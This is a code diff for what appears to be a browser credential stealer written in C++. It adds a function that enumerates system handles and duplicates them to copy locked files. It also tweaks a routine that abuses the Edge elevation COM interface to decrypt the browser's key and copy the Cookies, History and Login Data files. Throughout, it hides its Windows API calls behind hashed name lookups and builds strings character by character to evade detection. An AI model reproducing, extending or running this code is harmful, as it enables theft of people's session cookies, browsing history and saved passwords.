@@ -60,6 +60,213 @@ struct IElevatorEdge
     IElevatorEdgeVtbl* lpVtbl;
 };
 
+#define SystemExtendedHandleInformation 64
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
+    PVOID Object;
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR HandleValue;
+    ULONG GrantedAccess;
+    USHORT CreatorBackTraceIndex;
+    USHORT ObjectTypeIndex;
+    ULONG HandleAttributes;
+    ULONG Reserved;
+} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
+    ULONG_PTR NumberOfHandles;
+    ULONG_PTR Reserved;
+    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
+} SYSTEM_HANDLE_INFORMATION_EX;
+
+
+bool CreateCopyFile(char* filename, char* newFileName) {
+    ApiResolve apiResolve;
+    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
+
+    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
+
+    constexpr unsigned int hashGetLastError = ComplexHashForAnsi("GetLastError");
+    typedef DWORD(WINAPI* _GetLastError)();
+    _GetLastError pGetLastError = (_GetLastError)apiResolve.GetApiAddress(lpKernel32, hashGetLastError);
+
+    constexpr unsigned int hashCloseHandle = ComplexHashForAnsi("CloseHandle");
+    typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
+    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);
+
+    constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
+    LPVOID lpNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
+
+    constexpr unsigned int hashNtQuerySystemInformation = ComplexHashForAnsi("NtQuerySystemInformation");
+    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
+        ULONG,
+        PVOID,
+        ULONG,
+        PULONG
+        );
+
+    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)apiResolve.GetApiAddress(lpNtdll, hashNtQuerySystemInformation);
+
+    ULONG size = 0x10000;
+    LPVOID handleInfoBuffer = nullptr;
+    NTSTATUS status;
+
+    do {
+        AllocMemory(size, &handleInfoBuffer);
+
+        status = pNtQuerySystemInformation(
+            SystemExtendedHandleInformation,
+            handleInfoBuffer,
+            size,
+            &size
+        );
+
+        if (status == STATUS_INFO_LENGTH_MISMATCH)
+            size *= 2;
+
+    } while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+    if (status < 0) {
+        return 1;
+    }
+
+    auto info = (SYSTEM_HANDLE_INFORMATION_EX*)handleInfoBuffer;
+    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
+        auto& h = info->Handles[i];
+        HANDLE handle = (HANDLE)h.HandleValue;
+
+        char path[MAX_PATH] = { 0 };
+        constexpr unsigned int hashGetFinalPathNameByHandleA = ComplexHashForAnsi("GetFinalPathNameByHandleA");
+        typedef DWORD(WINAPI* _GetFinalPathNameByHandleA)(
+            HANDLE,
+            LPSTR,
+            DWORD,
+            DWORD
+            );
+        _GetFinalPathNameByHandleA pGetFinalPathNameByHandleA = (_GetFinalPathNameByHandleA)apiResolve.GetApiAddress(lpKernel32, hashGetFinalPathNameByHandleA);
+        DWORD len = pGetFinalPathNameByHandleA(
+            handle,
+            path,
+            MAX_PATH,
+            FILE_NAME_NORMALIZED
+        );
+
+        if (len == 0 || len >= MAX_PATH)
+            continue;
+
+        //char pattern[] = "test.txt\0";
+        char* pointer = NULL;
+        FindPatternA(path, filename, StrLen(filename), &pointer);
+        if (pointer == NULL) {
+            continue;
+        }
+        pCloseHandle(handle);
+        return 1;
+        constexpr unsigned int hashOpenProcess = ComplexHashForAnsi("OpenProcess");
+        typedef HANDLE(WINAPI* _OpenProcess)(DWORD, BOOL, DWORD);
+        _OpenProcess pOpenProcess = (_OpenProcess)apiResolve.GetApiAddress(lpKernel32, hashOpenProcess);
+        HANDLE hProc = pOpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)h.UniqueProcessId);
+        if (!hProc) {
+            continue;
+        }
+
+        HANDLE hCopy = NULL;
+        constexpr unsigned int hashDuplicateHandle = ComplexHashForAnsi("DuplicateHandle");
+        typedef BOOL(WINAPI* _DuplicateHandle)(
+            HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD
+            );
+        _DuplicateHandle pDuplicateHandle = (_DuplicateHandle)apiResolve.GetApiAddress(lpKernel32, hashDuplicateHandle);
+        BOOL dupOk = pDuplicateHandle(
+            (HANDLE)hProc,
+            handle,
+            (HANDLE)-1,
+            &hCopy,
+            GENERIC_READ,
+            FALSE,
+            0
+        );
+
+        //pCloseHandle(hProc);
+        if (!dupOk) {
+            continue;
+        }
+
+        constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
+        typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+        _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
+        HANDLE hOut = pCreateFileA(
+            newFileName,
+            GENERIC_WRITE,
+            0,
+            NULL,
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
+
+        if (hOut == INVALID_HANDLE_VALUE) {
+            pCloseHandle(hCopy);
+            return 1;
+        }
+
+
+        char buffer[4096];
+        DWORD bytesRead = 0;
+        DWORD bytesWritten = 0;
+
+        ULONGLONG offset = 0;
+
+        while (true) {
+            OVERLAPPED ov = {};
+            ov.Offset = (DWORD)(offset & 0xFFFFFFFF);
+            ov.OffsetHigh = (DWORD)(offset >> 32);
+
+            constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
+            typedef BOOL(WINAPI* _ReadFile)(
+                HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED
+                );
+            _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
+            BOOL ok = pReadFile(
+                hCopy,
+                buffer,
+                sizeof(buffer),
+                &bytesRead,
+                &ov
+            );
+
+            if (!ok) {
+                DWORD err = pGetLastError();
+
+                if (err == ERROR_HANDLE_EOF)
+                    break;
+                break;
+            }
+
+            if (bytesRead == 0)
+                break;
+
+            constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
+            typedef BOOL(WINAPI* _WriteFile)(
+                HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED
+                );
+            _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
+            if (!pWriteFile(hOut, buffer, bytesRead, &bytesWritten, NULL)) {
+                break;
+            }
+
+            offset += bytesRead;
+        }
+
+        pCloseHandle(hCopy);
+        pCloseHandle(hOut);
+        break;
+    }
+
+    FreeMemory(handleInfoBuffer);
+    return 1;
+}
+
 void DecryptKey() {
     CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
     IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
@@ -150,8 +357,8 @@ void DecryptKey() {
     char cookiesFilename[] = {'\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
     char passwordFilename[] = {'\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };
 
-    CopyStringA(cookiesFilename, cookiesPath + StrLen(cookiesPath), MAX_PATH - StrLen(passwordPath));
-    CopyStringA(historyFilename, historyPath + StrLen(historyPath), MAX_PATH - StrLen(passwordPath));
+    CopyStringA(cookiesFilename, cookiesPath + StrLen(cookiesPath), MAX_PATH - StrLen(cookiesPath));
+    CopyStringA(historyFilename, historyPath + StrLen(historyPath), MAX_PATH - StrLen(historyPath));
     CopyStringA(passwordFilename, passwordPath + StrLen(passwordPath), MAX_PATH - StrLen(passwordPath));
 
     char orCookiesPath[MAX_PATH] = { 0 };
@@ -354,22 +561,35 @@ void DecryptKey() {
         _CopyFileA pCopyFileA = (_CopyFileA)apiResolve.GetApiAddress(lpKernel32, hashCopyFileA);
         if (!pCopyFileA) { return; }
         
-        while (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
+        //CreateCopyFile(cookiesFilename, cookiesPath);
+        //CreateCopyFile(historyFilename, historyPath);
+        //CreateCopyFile(passwordFilename, passwordPath);
+
+        if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
+            
+        }
+
+        if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
+            
+        }
+
+        if (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
             
         }
         
-        while (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
-
-        }
-
-        while (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
-
-        }
-        
+        //CreateCopyFile(historyFilename, historyPath);
+        //CreateCopyFile(cookiesFilename, cookiesPath);
+        //CreateCopyFile(passwordFilename, passwordPath);
 
         pSysFreeString(decryptedDataBSTR);
         pCloseHandle(hFile);
     }
+
+    FreeMemory(fileBuf);
+    //constexpr unsigned int hashExitThread = ComplexHashForAnsi("ExitThread");
+    //typedef VOID(WINAPI* _ExitThread)(DWORD);
+    //_ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
+    //pExitThread(0);
 }
 
 int main() {
